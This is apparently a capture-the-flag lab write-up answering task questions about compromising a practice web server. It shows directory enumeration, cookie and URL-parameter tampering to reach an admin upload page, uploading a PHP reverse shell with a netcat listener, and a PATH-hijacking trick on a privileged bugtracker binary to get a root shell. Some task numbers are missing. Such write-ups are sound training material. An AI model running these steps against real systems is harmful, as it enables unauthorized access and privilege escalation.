Task 1

With what kind of tool can intercept web traffic?

Answer: Proxy

Task 2

What is the path to the directory on the webserver that returns a login page?

└─$ dirb http://10.129.95.191/ /usr/share/wordlists/dirb/small.txt

Only the following directories were found:

/css/
/images/
/js/
/uploads/

Using Burp Suite and spidering the website, I discovered the login page:

http://10.129.95.191/cdn-cgi/login/

Answer: /cdn-cgi/login

Task 3

What can be modified in Firefox to get access to the upload page?

The intercepted request looked like this:

GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1

Cookie: user=2233; role=guest

The cookie had to be modified.

I initially misunderstood the hint and tried decreasing the cookie user ID from 2233 to 1 using Burp Intruder.

The correct approach was to change the account ID in the URL:

http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2

to

http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1

which revealed:

Access ID    Name    Email
34322        admin   admin@megacorp.com

Answer: 34322

Task 5

On uploading a file, what directory does that file appear in on the server?

The upload directory was already discovered during directory enumeration:

/uploads

I uploaded /usr/share/webshells/php/php-reverse-shell.php, edited the cookie while intercepting the upload request, started a listener:

nc -lvnp 1234

and visited:

http://<TARGET_IP>/uploads/php-reverse-shell.php

which resulted in a reverse shell as www-data.

I upgraded the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'

I obtained the user flag:

cd /home/robert
cat user.txt

f2c74ee8db7983851ab2a96a44eb7981

Answer: /uploads

Regardless of which user starts running the bugtracker executable, whose privileges will it use?

Task 10

What is the name of the executable being called in an insecure manner?

Running the program revealed that it internally called cat without using an absolute path:

/usr/bin/bugtracker

Provide Bug ID: 123123

cat: /root/reports/123123: No such file or directory

This made it vulnerable to a PATH hijacking attack.

I created a fake cat executable:

echo "/bin/sh" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

Then executed:

bugtracker

which spawned a root shell:

# whoami

root

The root flag was located in the root directory. Since cat was hijacked, I used head or strings instead:

af13b0bee69f8a877c3faf667f7beacf

Answer: cat
